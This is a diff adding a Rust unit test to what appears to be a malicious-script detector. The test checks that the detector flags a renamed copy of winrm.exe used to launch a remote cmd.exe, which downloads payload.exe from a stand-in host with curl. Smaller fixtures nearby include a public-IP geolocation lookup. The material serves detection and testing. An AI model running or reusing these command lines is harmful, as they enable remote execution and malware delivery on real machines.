@@ -3269,6 +3269,42 @@ C:\Users\Public\wr.tmp -r:target.example cmd.exe /V:ON /c set U=https://copied-w
     }
 
     #[test]
+    fn copied_winrm_alias_replays_remote_cmd_child() {
+        let script = br#"copy C:\Windows\System32\winrm.exe C:\Users\Public\wm.tmp
+C:\Users\Public\wm.tmp invoke Create wmicimv2/Win32_Process -r:target.example @{CommandLine="cmd.exe /V:ON /c set U=https://copied-winrm.example/payload.exe&&curl -o payload.exe !U!";CurrentDirectory="C:\Windows"}"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\wm.tmp"#)
+            )),
+            "copied winrm alias invocation was not tied back to WindowsUtilManip: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://copied-winrm.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "copied winrm remote child command was not analyzed: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::RemoteExec { tool, target_host }
+                    if tool == "winrm" && target_host == "target.example"
+            )),
+            "copied winrm remote exec trait missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn geoplugin_public_ip_lookup_emits_network_probe() {
         let script = br#"@echo off
 for /f "tokens=1 delims=:" %%A in ('curl -# -k "http://www.geoplugin.net/php.gp?ip"') do set geo=%%A
